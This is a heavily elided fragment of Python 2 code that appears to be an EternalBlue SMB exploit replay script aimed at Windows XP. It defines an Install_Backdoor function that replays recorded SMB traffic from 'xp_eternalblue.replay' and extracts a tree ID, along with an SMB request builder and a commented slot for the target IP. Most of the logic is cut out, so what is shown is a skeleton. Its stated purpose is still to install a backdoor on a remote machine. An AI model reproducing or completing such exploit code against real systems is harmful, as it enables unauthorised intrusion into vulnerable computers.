...
def Install_Backdoor():
	backlog = open("xp_eternalblue.replay").read().split("\n\n")
	...
	for i in backlog:
		...
		if i[0] == "recv":
			...
			if index == 3:
				treeid = data[0][28:30]
				print "tid",binascii.b2a_hex(treeid)
...
def make_xp_smb_request(send_data , key):
...
if __name__ == "__main__":
	...
	#对方ip地址 
	step_2_data =""
